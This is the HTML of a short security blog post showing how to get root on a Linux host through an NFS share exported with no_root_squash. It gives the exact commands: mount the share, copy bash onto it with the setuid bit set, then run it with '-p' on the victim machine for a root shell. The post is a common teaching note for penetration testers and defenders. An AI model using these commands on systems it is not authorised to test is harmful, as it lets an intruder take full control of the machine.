<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>NFS no_root_squash privesc | S4MY9’s Blog</title><meta name=keywords content="Linux,Privesc,NFS"><meta name=description content="Introduction In some environments, the root user on a networked file system is treated as an unprivileged user. This is known as &ldquo;root squashing.&rdquo; If root squashing is disabled, an attacker who gains access to an unprivileged account on the file system may be able to escalate their privileges to root.
Demonstration Attacker machine Create a directory named /tmp/mount:
mkdir /tmp/mount Mount the network file system to /tmp/mount:
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/mount Copy the /bin/bash binary from the attacker&rsquo;s system to the mounted file system:"><meta name=author content><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://s4my9.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://s4my9.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://s4my9.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://s4my9.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://s4my9.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="NFS no_root_squash privesc"><meta property="og:description" content="Introduction In some environments, the root user on a networked file system is treated as an unprivileged user. This is known as &ldquo;root squashing.&rdquo; If root squashing is disabled, an attacker who gains access to an unprivileged account on the file system may be able to escalate their privileges to root.
Demonstration Attacker machine Create a directory named /tmp/mount:
mkdir /tmp/mount Mount the network file system to /tmp/mount:
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/mount Copy the /bin/bash binary from the attacker&rsquo;s system to the mounted file system:"><meta property="og:type" content="article"><meta property="og:url" content="https://s4my9.github.io/posts/no-root-squash-privesc/"><meta property="og:image" content="https://s4my9.github.io/%3Cimage%20path/url%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-11T11:30:03+00:00"><meta property="article:modified_time" content="2023-04-11T11:30:03+00:00"><meta property="og:site_name" content="S4MY9’s Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4my9.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="NFS no_root_squash privesc"><meta name=twitter:description content="Introduction In some environments, the root user on a networked file system is treated as an unprivileged user. This is known as &ldquo;root squashing.&rdquo; If root squashing is disabled, an attacker who gains access to an unprivileged account on the file system may be able to escalate their privileges to root.
Demonstration Attacker machine Create a directory named /tmp/mount:
mkdir /tmp/mount Mount the network file system to /tmp/mount:
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/mount Copy the /bin/bash binary from the attacker&rsquo;s system to the mounted file system:"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://s4my9.github.io/posts/"},{"@type":"ListItem","position":2,"name":"NFS no_root_squash privesc","item":"https://s4my9.github.io/posts/no-root-squash-privesc/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"NFS no_root_squash privesc","name":"NFS no_root_squash privesc","description":"Introduction In some environments, the root user on a networked file system is treated as an unprivileged user. This is known as \u0026ldquo;root squashing.\u0026rdquo; If root squashing is disabled, an attacker who gains access to an unprivileged account on the file system may be able to escalate their privileges to root.\nDemonstration Attacker machine Create a directory named /tmp/mount:\nmkdir /tmp/mount Mount the network file system to /tmp/mount:\nmount -t nfs \u0026lt;IP\u0026gt;:\u0026lt;SHARED_FOLDER\u0026gt; /tmp/mount Copy the /bin/bash binary from the attacker\u0026rsquo;s system to the mounted file system:","keywords":["Linux","Privesc","NFS"],"articleBody":"Introduction In some environments, the root user on a networked file system is treated as an unprivileged user. This is known as “root squashing.” If root squashing is disabled, an attacker who gains access to an unprivileged account on the file system may be able to escalate their privileges to root.\nDemonstration Attacker machine Create a directory named /tmp/mount:\nmkdir /tmp/mount Mount the network file system to /tmp/mount:\nmount -t nfs : /tmp/mount Copy the /bin/bash binary from the attacker’s system to the mounted file system:\ncp /usr/bin/bash /tmp/mount Change the permissions on the copied bash binary to make it setuid root:\nchmod +s bash Victim machine Execute the modified bash binary with the -p option, which causes bash to open a root shell:\n./bash -p ","wordCount":"126","inLanguage":"en","image":"https://s4my9.github.io/%3Cimage%20path/url%3E","datePublished":"2023-04-11T11:30:03Z","dateModified":"2023-04-11T11:30:03Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://s4my9.github.io/posts/no-root-squash-privesc/"},"publisher":{"@type":"Organization","name":"S4MY9’s Blog","logo":{"@type":"ImageObject","url":"https://s4my9.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4my9.github.io/ accesskey=h title="S4MY9’s Blog (Alt + H)">S4MY9’s Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://s4my9.github.io/posts/ title=Posts><span>Posts</span></a></li><li><a href=https://s4my9.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://s4my9.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://s4my9.github.io/posts/>Posts</a></div><h1 class=post-title>NFS no_root_squash privesc</h1><div class=post-meta><span title='2023-04-11 11:30:03 +0000 +0000'>April 11, 2023</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;126 words</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#demonstration>Demonstration</a><ul><li><a href=#attacker-machine>Attacker machine</a></li><li><a href=#victim-machine>Victim machine</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>In some environments, the root user on a networked file system is treated as an unprivileged user. This is known as &ldquo;root squashing.&rdquo; If root squashing is disabled, an attacker who gains access to an unprivileged account on the file system may be able to escalate their privileges to root.</p><h2 id=demonstration>Demonstration<a hidden class=anchor aria-hidden=true href=#demonstration>#</a></h2><h3 id=attacker-machine>Attacker machine<a hidden class=anchor aria-hidden=true href=#attacker-machine>#</a></h3><p>Create a directory named /tmp/mount:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir /tmp/mount
</span></span></code></pre></div><p>Mount the network file system to /tmp/mount:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mount -t nfs &lt;IP&gt;:&lt;SHARED_FOLDER&gt; /tmp/mount
</span></span></code></pre></div><p>Copy the /bin/bash binary from the attacker&rsquo;s system to the mounted file system:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cp /usr/bin/bash /tmp/mount
</span></span></code></pre></div><p>Change the permissions on the copied bash binary to make it setuid root:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>chmod +s bash
</span></span></code></pre></div><h3 id=victim-machine>Victim machine<a hidden class=anchor aria-hidden=true href=#victim-machine>#</a></h3><p>Execute the modified bash binary with the -p option, which causes bash to open a root shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./bash -p
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4my9.github.io/tags/linux/>Linux</a></li><li><a href=https://s4my9.github.io/tags/privesc/>Privesc</a></li><li><a href=https://s4my9.github.io/tags/nfs/>NFS</a></li></ul><nav class=paginav><a class=next href=https://s4my9.github.io/posts/lfi-to-rce-with-log-poisoning/><span class=title>Next »</span><br><span>LFI to RCE with Log Poisoning</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://s4my9.github.io/>S4MY9’s Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>